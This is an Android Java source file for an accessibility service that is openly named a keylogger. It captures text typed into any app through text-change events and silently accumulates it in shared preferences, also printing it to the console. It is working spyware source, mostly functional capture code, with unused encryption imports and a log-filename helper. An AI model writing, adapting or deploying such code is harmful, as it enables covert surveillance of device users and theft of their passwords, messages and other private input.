package com.gpow.androidkeylogger;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.SharedPreferences;
import android.preference.PreferenceManager;
import android.view.accessibility.AccessibilityEvent;

import com.facebook.android.crypto.keychain.AndroidConceal;
import com.facebook.android.crypto.keychain.SharedPrefsBackedKeyChain;
import com.facebook.crypto.Crypto;
import com.facebook.crypto.CryptoConfig;
import com.facebook.crypto.Entity;
import com.facebook.crypto.keychain.KeyChain;
import com.facebook.crypto.util.SystemNativeCryptoLibrary;

import java.io.BufferedOutputStream;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

public class KeyLoggerAccessibilityService extends AccessibilityService {

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        final int eventType = event.getEventType();

        // Text information received from the event
        String eventText = "" + event.getText();
        eventText = eventText.substring(1, eventText.length()-1);

        switch(eventType) {
        /*
            You can use catch other events like touch and focus
        */

//            case AccessibilityEvent.TYPE_VIEW_CLICKED:
//                 eventText = "Clicked" + "[" + event.getPackageName() + "]: ";
//                 break;
//            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
//                 eventText = "Focused" + "[" + event.getPackageName() + "]: ";
//                 break;
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
//                eventText = "Typed" + "[" + event.getPackageName() + "]: ";
                saveContents("" + eventText);
                break;
        }

        //print the typed text in the console. Or do anything you want here.
        System.out.println("ACCESSIBILITY SERVICE : "+eventText);

    }

    @Override
    public void onInterrupt() {
        //whatever
    }

    @Override
    public void onServiceConnected() {
        //configure our Accessibility service
        AccessibilityServiceInfo info=getServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_SPOKEN;
        info.notificationTimeout = 100;
        this.setServiceInfo(info);
    }

    private void saveContents(String eventLog) {
        try {
            SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(this);
            String savedLog = preferences.getString("KeyLogger", "");
            String newLog;

            if (savedLog.equals(eventLog)) {
                return;
            }
            // Check if the savedLog contains part of the eventLog
            // Cond 1: Check if savedLog is bigger than eventLog
            // Use-case: for saving text repeatedly when user hits backspace
            // Cond 2: Check if savedLog contains part of eventLog
            // Use-case: to avoid saving repeatedly as user types each character
            else if (savedLog.length() > eventLog.length() && eventLog.contains(savedLog.substring(savedLog.length() - eventLog.length()))) {
                // Updated savedLog as follows: savedLog - oldLog + newLog
                // NOTE: Here the old and new logs are from the same events
                newLog = savedLog.substring(0, savedLog.length() - eventLog.length()) + eventLog;
            }
            else {
                newLog = savedLog + "\r\n" + eventLog;
            }

            preferences = PreferenceManager.getDefaultSharedPreferences(this);
            SharedPreferences.Editor editor = preferences.edit();
            editor.putString("KeyLogger", newLog);
            editor.apply();
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }

    private String getFilename() {
        String date = new SimpleDateFormat("dd-MM-yyyy").format(new Date());
        return date+"_loglogs";
    }
}
